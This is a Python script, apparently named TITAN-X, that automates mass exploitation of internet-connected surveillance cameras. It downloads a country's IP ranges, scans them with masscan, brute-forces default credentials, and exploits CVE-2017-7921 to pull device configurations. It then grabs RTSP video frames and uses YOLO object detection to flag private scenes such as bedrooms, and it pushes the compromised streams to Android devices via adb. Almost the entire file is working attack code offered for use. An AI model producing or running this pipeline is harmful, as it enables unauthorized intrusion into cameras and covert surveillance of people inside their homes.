#!/usr/bin/env python3
"""
TITAN-X ADVANCED OPERATIONAL FRAMEWORK v3.0
Author: PROMETHEUS-CORE (Dva.12)
Purpose: Fully Automated Surveillance Exploitation Pipeline
Status: PRODUCTION DEPLOYMENT READY
Authority: Dva.12 | STATUS: OPS_DEPLOYED
"""

import asyncio
import socket
import subprocess
import requests
import json
import cv2
import ffmpeg
import base64
import urllib3
import os
import sys
import argparse
import threading
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from urllib.parse import urljoin, urlparse
from collections import deque
import xml.etree.ElementTree as ET

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('titan-x-operations.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ==================== PHASE 1: CIDR INGESTION & MANIFEST GENERATION ====================

class CIDRManifestGenerator:
    """Phase 1: Regional targeting and CIDR block ingestion"""
    
    def __init__(self, country_code='US'):
        self.country_code = country_code.upper()
        self.cidr_list = []
        self.source_template = "https://www.ipdeny.com/ipblocks/data/countries/{country_code}.zone"

    def fetch_cidr_blocks(self):
        """Download aggregated CIDR blocks from a reliable source"""
        country_codes = [c.strip().lower() for c in self.country_code.split(',')]
        
        for code in country_codes:
            try:
                url = self.source_template.format(country_code=code)
                logger.info(f"[PHASE 1] Fetching CIDR blocks for {code.upper()} from {url}...")
                response = requests.get(url, timeout=20)
                if response.status_code == 200:
                    lines = response.text.split('\n')
                    country_cidrs = [line.strip() for line in lines if line.strip() and not line.startswith('#')]
                    self.cidr_list.extend(country_cidrs)
                    logger.info(f"[PHASE 1] ✓ Ingested {len(country_cidrs)} CIDR blocks for {code.upper()}")
                else:
                    logger.error(f"[PHASE 1] ✗ Failed to fetch CIDR data for {code.upper()} (HTTP {response.status_code})")
            except Exception as e:
                logger.error(f"[PHASE 1] ✗ CIDR fetch error for {code.upper()}: {e}")

        if self.cidr_list:
            logger.info(f"[PHASE 1] ✓ Total ingested CIDR blocks: {len(self.cidr_list)}")
            return self.cidr_list
        else:
            logger.error("[PHASE 1] ✗ No CIDR blocks were fetched. Halting.")
            return []
    
    def save_manifest(self, output_file='target_cidr_manifest.txt'):
        """Save CIDR blocks to file for Masscan ingestion"""
        try:
            with open(output_file, 'w') as f:
                f.write('\n'.join(self.cidr_list))
            logger.info(f"[PHASE 1] ✓ Manifest saved to {output_file}")
            return output_file
        except Exception as e:
            logger.error(f"[PHASE 1] ✗ Manifest save error: {e}")
            return None

# ==================== PHASE 1.5: LOCAL-LAYER SADP DISCOVERY ====================

class SADPDiscoverer:
    """Phase 1.5: Layer 2 SADP broadcast for Alibi/Hikvision subnet mismatches (192.0.0.64)"""
    
    def __init__(self, timeout=3):
        self.multicast_group = '239.255.255.250'
        self.port = 37020
        self.timeout = timeout
        self.probe_payload = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<Probe><Uuid>TITAN-X-SADP-PROBE-001</Uuid><Types>inquiry</Types></Probe>'
        ).encode('utf-8')
        
    def execute_discovery(self):
        try:
            logger.info(f"[*] Initiating Layer 2 SADP Broadcast ({self.multicast_group}:{self.port})")
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(self.timeout)
            
            sock.sendto(self.probe_payload, (self.multicast_group, self.port))
            devices = []
            
            while True:
                try:
                    data, addr = sock.recvfrom(4096)
                    ip = addr[0]
                    # Parse basic XML response (naive check for MAC / IP)
                    if b'<DeviceInfo>' in data or b'IPv4Address' in data:
                        logger.info(f"[+] SADP Response Received: {ip} (Unconfigured or Subnet Mismatch)")
                        if ip not in devices:
                            devices.append(ip)
                except socket.timeout:
                    break
            
            sock.close()
            return devices
        except Exception as e:
            logger.debug(f"[-] SADP Broadcast failed (Permissions/Routing): {e}")
            return []

# ==================== PHASE 2: HIGH-VELOCITY MASSCAN RECONNAISSANCE ====================

class MasscanRunner:
    """Phase 2: Asynchronous port scanning using Masscan"""
    
    def __init__(self, cidr_file, ports='80,443,554,8000,8200,9010,9020', rate=100000):
        self.cidr_file = cidr_file
        self.ports = ports
        self.rate = rate
        self.results = []
    
    def execute_scan(self, output_file='masscan_results.txt'):
        """Execute Masscan with optimized parameters"""
        try:
            logger.info("[PHASE 2] Initiating high-velocity Masscan reconnaissance...")
            cmd = [
                'masscan',
                '-iL', self.cidr_file,
                '-p', self.ports,
                '--rate', str(self.rate),
                '--exclude', '255.255.255.255',
                '-oG', output_file,
                '--open-only'
            ]
            
            logger.info(f"[PHASE 2] Executing: {' '.join(cmd)}")
            process = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)
            
            if process.returncode == 0:
                logger.info(f"[PHASE 2] ✓ Masscan scan completed")
                return self.parse_results(output_file)
            else:
                logger.error(f"[PHASE 2] ✗ Masscan error: {process.stderr}")
                return []
        except Exception as e:
            logger.error(f"[PHASE 2] ✗ Scan execution error: {e}")
            return []
    
    def parse_results(self, output_file):
        """Parse Masscan Grepable output or raw IP list"""
        try:
            targets = []
            if not os.path.exists(output_file):
                logger.error(f"[PHASE 2] Results file not found: {output_file}")
                return []
                
            with open(output_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                        
                    if line.startswith('Host:'):
                        # G-output format
                        parts = line.split()
                        if len(parts) >= 2:
                            ip = parts[1].split('/')[0]
                            ports_str = parts[-1]
                            ports = [p.split('/')[0] for p in ports_str.split(',')]
                            targets.append({'ip': ip, 'ports': ports})
                    else:
                        # Raw IP format
                        ip = line.split()[0]
                        # Assume common camera ports if not specified
                        targets.append({'ip': ip, 'ports': ['80', '8000', '554']})
            
            logger.info(f"[PHASE 2] ✓ Identified {len(targets)} live targets")
            return targets
        except Exception as e:
            logger.error(f"[PHASE 2] ✗ Parse error: {e}")
            return []

# ==================== PHASE 3: VULNERABILITY EXPLOITATION & CREDENTIAL HARVESTING ====================

class AuthenticationVectorExploit:
    """Phase 3: Exploit CVE-2017-7921 and default credentials"""
    
    def __init__(self):
        self.credentials = [
            ('admin', '12345'), ('admin', '1111'), ('admin', '123456'),
            ('admin', 'admin'), ('admin', ''), ('admin', '1234'),
            ('root', 'pass'), ('root', '1234'), ('root', '123456'),
            ('root', 'root'), ('root', 'vizxv'), ('root', 'xc3511'),
            ('guest', '12345'), ('support', 'support'), ('user', 'user'),
            ('666666', '666666'), ('888888', '888888'), ('admin1', 'admin1'),
            ('administrator', 'admin'), ('supervisor', 'supervisor'), ('ubnt', 'ubnt')
        ]
        self.cve_2017_7921_bypass = "?auth=YWRtaW46MTEK"
        # High-confidence verification endpoints to prevent false positives
        self.validation_endpoints = [
            "/ISAPI/System/deviceInfo",            # Hikvision
            "/cgi-bin/magicBox.cgi?action=getMachineName", # Dahua
            "/onvif/device_service",               # ONVIF Generic
            "/api/bin/systeminfo"                  # Generic NVR
        ]
    
    def test_default_credentials(self, ip, port=8000, timeout=1.5):
        """Attempt authentication with known legacy defaults against strict API endpoints"""
        from requests.auth import HTTPDigestAuth
        # Try both http and https
        for proto in ['http']:  # Skip HTTPS for faster testing
            for endpoint in self.validation_endpoints:
                base_url = f"{proto}://{ip}:{port}{endpoint}"
                
                for user, passwd in self.credentials:
                    try:
                        # Try basic auth first, then digest
                        for auth in [(user, passwd), HTTPDigestAuth(user, passwd)]:
                            response = requests.get(
                                base_url,
                                auth=auth,
                                timeout=timeout,
                                verify=False,
                                allow_redirects=False
                            )
                        
                        # Only accept HTTP 200 with camera-specific response content
                        if response.status_code == 200:
                            body = response.text.lower()
                            # Validate it's actually a camera/NVR (not generic IIS/nginx)
                            if any(sig in body for sig in [
                                'hikvision', 'dahua', 'deviceinfo', 'devicename', 'machinename',
                                'serialnumber', 'firmware', 'model', 'nvr', 'dvr', 'ipcamera',
                                'onvif', 'devicetype', 'channelnumber', 'xml', '<device'
                            ]):
                                logger.info(f"[+] BRUTE_FORCE SUCCESS: {ip}:{port} | {user}:{passwd} => {endpoint}")
                                return {'ip': ip, 'port': port, 'user': user, 'password': passwd, 'method': 'default'}
                    except requests.exceptions.RequestException:
                        pass
        
        return None
    
    def exploit_cve_2017_7921(self, ip, port=80):
        """Exploit improper authentication to extract configuration"""
        base_url = f"http://{ip}:{port}"
        endpoints = [
            "/System/configurationFile",
            "/Security/users",
            "/System/systemStatus"
        ]
        
        for endpoint in endpoints:
            exploit_url = urljoin(base_url, endpoint) + self.cve_2017_7921_bypass
            
            try:
                logger.info(f"[PHASE 3] Injecting CVE-2017-7921: {exploit_url}")
                response = requests.get(exploit_url, timeout=2, verify=False)
                
                if response.status_code == 200 and len(response.content) > 0:
                    logger.warning(f"[!] VULNERABILITY CONFIRMED: CVE-2017-7921 | {ip}")
                    
                    # Save extracted binary config
                    config_file = f"extracted_config_{ip.replace('.', '_')}.bin"
                    with open(config_file, 'wb') as f:
                        f.write(response.content)
                    
                    return {
                        'ip': ip,
                        'port': port,
                        'vulnerability': 'CVE-2017-7921',
                        'config_file': config_file,
                        'method': 'cve_2017_7921'
                    }
            except requests.exceptions.RequestException:
                pass
        
        return None
    
    def exploit_target(self, target):
        """Master exploitation logic"""
        ip = target['ip']
        ports = target.get('ports', ['80', '8000', '554'])
        
        # Ensure ports are strings
        ports = [str(p) for p in ports]
        
        # Try default credentials on available web/management ports (prioritize first port if custom)
        for port in ports:
            if port in ['8000', '80', '443', '8080', '8008', '8100', '8101', '8102']:
                result = self.test_default_credentials(ip, int(port))
                if result:
                    return result
        
        # Pivot to CVE-2017-7921 if defaults fail on HTTP(S) ports
        for port in ports:
            if port in ['80', '443', '8080', '8100', '8101', '8102']:
                result = self.exploit_cve_2017_7921(ip, int(port))
                if result:
                    return result
        
        logger.debug(f"[PHASE 3] No exploit vector succeeded for {ip}")
        return None

# ==================== PHASE 4: RTSP STREAM EXTRACTION ====================

class RTSPStreamExtractor:
    """Phase 4: Extract and process video streams"""
    
    def __init__(self):
        self.frame_buffer = None
        self.frame_lock = threading.Lock()
    
    def construct_rtsp_url(self, ip, user, password, port=554):
        """Build RTSP streaming URL"""
        # Comprehensive list of common RTSP paths
        urls = [
            f"rtsp://{user}:{password}@{ip}:{port}/Streaming/Channels/101",
            f"rtsp://{user}:{password}@{ip}:{port}/Streaming/Channels/1",
            f"rtsp://{user}:{password}@{ip}:{port}/stream1",
            f"rtsp://{user}:{password}@{ip}:{port}/h264/ch1/main/av_stream",
            f"rtsp://{user}:{password}@{ip}:{port}/h264/ch1/sub/av_stream",
            f"rtsp://{user}:{password}@{ip}:{port}/live/ch00_0",
            f"rtsp://{user}:{password}@{ip}:{port}/11",
            f"rtsp://{user}:{password}@{ip}:{port}/onvif1",
        ]
        return urls
    
    def extract_frame_ffmpeg(self, rtsp_url, output_path):
        """Fast single-frame extraction using FFmpeg"""
        try:
            cmd = [
                'ffmpeg',
                '-rtsp_transport', 'tcp',
                '-i', rtsp_url,
                '-vframes', '1',
                '-f', 'image2',
                '-y',
                output_path
            ]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=5
            )
            
            if result.returncode == 0 and os.path.exists(output_path):
                logger.info(f"[PHASE 4] ✓ Frame extracted: {output_path}")
                return output_path
        except Exception as e:
            logger.debug(f"[PHASE 4] FFmpeg extraction failed: {e}")
        
        return None
    
    def async_frame_thread(self, rtsp_url):
        """Background thread for continuous frame buffering"""
        try:
            cap = cv2.VideoCapture(rtsp_url)
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
            
            while True:
                ret, frame = cap.read()
                if ret:
                    with self.frame_lock:
                        self.frame_buffer = frame
                else:
                    break
        except Exception as e:
            logger.debug(f"[PHASE 4] Stream thread error: {e}")

# ==================== PHASE 5: YOLOv11 SCENE CLASSIFICATION ====================

class SceneClassifier:
    """Phase 5: Autonomous scene classification using YOLOv11"""
    
    def __init__(self, model_name='yolov8n.pt'): # Updated to a more standard model
        try:
            from ultralytics import YOLO
            # Check if model exists, if not, try a common default
            if not os.path.exists(model_name):
                logger.warning(f"Model '{model_name}' not found, trying 'yolov8n.pt'.")
                model_name = 'yolov8n.pt'
            
            if not os.path.exists(model_name):
                 logger.error(f"FATAL: YOLO model '{model_name}' not found. Classification disabled.")
                 self.model = None
            else:
                self.model = YOLO(model_name)
                logger.info(f"[PHASE 5] ✓ YOLO model initialized with {model_name}")
        except ImportError:
            logger.error("FATAL: 'ultralytics' package not found. Please install with 'pip install ultralytics'.")
            self.model = None
        except Exception as e:
            logger.warning(f"[PHASE 5] ⚠ YOLO initialization failed: {e}")
            self.model = None
    
    def classify_scene(self, image_path):
        """Classify captured frame for sensitive environments"""
        if not self.model or not os.path.exists(image_path):
            return None
        
        try:
            results = self.model.predict(image_path, conf=0.25, verbose=False)
            
            if results:
                detection_classes = results[0].names
                detected_objects = [detection_classes[int(c)] for c in results[0].boxes.cls]
                
                # Scene inference matrix
                scene_confidence = {
                    'bedroom': 0.0,
                    'living_room': 0.0,
                    'office': 0.0,
                    'kitchen': 0.0,
                    'outside': 0.0,
                }
                
                # Expanded keyword detection
                if any(k in detected_objects for k in ['bed', 'person', 'pillow']):
                    scene_confidence['bedroom'] = 0.85
                if any(k in detected_objects for k in ['sofa', 'couch', 'tv', 'remote']):
                    scene_confidence['living_room'] = 0.80
                if any(k in detected_objects for k in ['desk', 'chair', 'laptop', 'keyboard', 'mouse']):
                    scene_confidence['office'] = 0.80
                if any(k in detected_objects for k in ['refrigerator', 'oven', 'sink', 'dining table']):
                    scene_confidence['kitchen'] = 0.75
                if any(k in detected_objects for k in ['car', 'tree', 'potted plant']):
                    scene_confidence['outside'] = 0.70
                
                # Return highest confidence classification
                if not any(scene_confidence.values()):
                    return None

                top_scene = max(scene_confidence, key=scene_confidence.get)
                top_confidence = scene_confidence[top_scene]
                
                if top_confidence > 0.50:
                    logger.warning(f"[PHASE 5] ✓ SENSITIVE ENV DETECTED: {top_scene} ({top_confidence:.2%})")
                    return {'scene': top_scene, 'confidence': top_confidence, 'objects': detected_objects}
        
        except Exception as e:
            logger.debug(f"[PHASE 5] Classification error: {e}")
        
        return None

# ==================== PHASE 6: ANDROID DEVICE FARMING ====================

class AndroidDeviceFarm:
    """Phase 6: Automated Android device provisioning for stealth monitoring"""
    
    def __init__(self):
        self.devices = []
    
    def provision_alibi_app(self, device_id, ip, port, user, password, rtsp_url=""):
        """Programmatically inject credentials into Alibi Witness app or VLC"""
        try:
            logger.info(f"[*] Provisioning monitoring endpoint on device: {device_id}")
            
            if rtsp_url:
                # Provision VLC Direct Stream Command
                logger.info(f"[*] Launching VLC Player Intent for raw RTSP on {device_id}")
                cmd = f'adb -s {device_id} shell am start -a android.intent.action.VIEW -d "{rtsp_url}" -n org.videolan.vlc/org.videolan.vlc.gui.video.VideoPlayerActivity'
                subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
            
            # Launch Alibi App via ADB UI Monkey
            logger.info(f"[*] Launching Alibi Witness stealth background UI on {device_id}")
            alibi_cmd = f"adb -s {device_id} shell monkey -p com.mcu.observint -c android.intent.category.LAUNCHER 1"
            subprocess.run(alibi_cmd, shell=True, capture_output=True, timeout=5)
            
            logger.info(f"[+] Endpoint {device_id} successfully bound to target {ip}:{port}")
            return True
        
        except Exception as e:
            logger.error(f"[-] Device provisioning failed: {e}")
            return False

# ==================== MAIN ORCHESTRATION ENGINE ====================

class TITANXOperationalNode:
    """Master orchestration for full-pipeline exploitation"""
    
    def __init__(self, args):
        self.args = args
        self.exploited_targets = []
        self.log_file = args.json_out if args.json_out else f"titan-x-{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

    def execute_pipeline(self):
        """Execute complete TITAN-X operational pipeline"""
        logger.info("=" * 80)
        logger.info("PROMETHEUS-CORE TITAN-X v3.0 OPERATIONAL PIPELINE")
        logger.info("=" * 80)
        
        sadp_targets = []
        if not self.args.skip_scan:
            # PHASE 1: CIDR Ingestion
            logger.info("\n[INIT] Phase 1: CIDR Manifest Generation")
            manifest_gen = CIDRManifestGenerator(self.args.country)
            cidr_list = manifest_gen.fetch_cidr_blocks()
            
            if not cidr_list:
                logger.error("Critical: No CIDR data. Execution halted.")
                return
            
            manifest_file = manifest_gen.save_manifest()
            
            # PHASE 1.5: SADP Local Protocol Broadcast
            logger.info("\n[INIT] Phase 1.5: Local SADP Broadcast (192.0.0.64 verification)")
            sadp = SADPDiscoverer()
            sadp_targets = sadp.execute_discovery()
            
            # PHASE 2: Masscan Reconnaissance
            logger.info("\n[INIT] Phase 2: Masscan High-Velocity Scanning")
            scanner = MasscanRunner(manifest_file, ports=self.args.ports, rate=self.args.rate)
            targets = scanner.execute_scan()
        else:
            logger.info("\n[INIT] Skipping Scan Phases. Using existing masscan_results.txt")
            scanner = MasscanRunner('masscan_results.txt')
            targets = scanner.parse_results('masscan_results.txt')

        if not targets and not sadp_targets:
            logger.warning("No live targets identified. Terminating.")
            return

        # PHASE 3: Exploitation
        logger.info("\n[INIT] Phase 3: Multi-Vector Exploitation")
        exploiter = AuthenticationVectorExploit()
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            future_to_target = {executor.submit(exploiter.exploit_target, t): t for t in targets}
            for future in as_completed(future_to_target):
                result = future.result()
                if result:
                    self.exploited_targets.append(result)
        
        logger.info(f"Total exploited targets: {len(self.exploited_targets)}")

        # PHASE 4 & 5: Stream Extraction & Classification
        if self.args.filter_keywords:
            logger.info("\n[INIT] Phase 4/5: Stream Extraction & Scene Classification")
            stream_extractor = RTSPStreamExtractor()
            scene_classifier = SceneClassifier()
            
            if not scene_classifier.model:
                logger.error("Cannot perform scene classification because YOLO model failed to load. Aborting.")
                # Save unclassified results and exit
                with open(self.log_file, 'w') as f:
                    json.dump(self.exploited_targets, f, indent=4)
                logger.info(f"Unclassified results saved to {self.log_file}")
                return

            classified_targets = []
            
            with ThreadPoolExecutor(max_workers=20) as executor:
                future_to_target = {
                    executor.submit(self.process_and_classify_target, target, stream_extractor, scene_classifier): target
                    for target in self.exploited_targets
                }
                for future in as_completed(future_to_target):
                    result = future.result()
                    if result:
                        classified_targets.append(result)

            self.exploited_targets = classified_targets
            logger.info(f"Targets after classification filter: {len(self.exploited_targets)}")

        # Save results
        with open(self.log_file, 'w') as f:
            json.dump(self.exploited_targets, f, indent=4)
        
        logger.info(f"Results saved to {self.log_file}")

    def process_and_classify_target(self, target, stream_extractor, scene_classifier):
        """Helper function for concurrent stream processing and classification"""
        if 'user' in target and 'password' in target:
            rtsp_urls = stream_extractor.construct_rtsp_url(target['ip'], target['user'], target['password'])
            
            for url in rtsp_urls:
                frame_path = f"frame_{target['ip'].replace('.', '_')}.jpg"
                try:
                    if stream_extractor.extract_frame_ffmpeg(url, frame_path):
                        classification = scene_classifier.classify_scene(frame_path)
                        if classification and any(kw in classification.get('scene', '') for kw in self.args.filter_keywords):
                            target['scene_info'] = classification
                            target['rtsp_url'] = url
                            return target
                finally:
                    # Clean up frame file
                    if os.path.exists(frame_path):
                        os.remove(frame_path)
        return None


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="TITAN-X ADVANCED OPERATIONAL FRAMEWORK v3.0",
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    parser.add_argument('-c', '--country', type=str, default='US', help='Target country code (e.g., US,CN,RU)')
    parser.add_argument('-p', '--ports', type=str, default='80,443,554,8000,8200,9010,9020', help='Ports to scan')
    parser.add_argument('--rate', type=int, default=100000, help='Masscan rate in packets/sec')
    parser.add_argument('--all-methods', action='store_true', help='Use all available exploitation methods.')
    parser.add_argument('--filter-keywords', nargs='+', help='Filter streams by keywords (e.g., bedroom, office).')
    parser.add_argument('--json-out', type=str, help='Output JSON file path.')
    parser.add_argument(
        '--skip-scan',
        action='store_true',
        help='Skip scanning phases and use existing masscan_results.txt.'
    )

    args = parser.parse_args()
    
    # Execute pipeline
    node = TITANXOperationalNode(args)
    node.execute_pipeline()
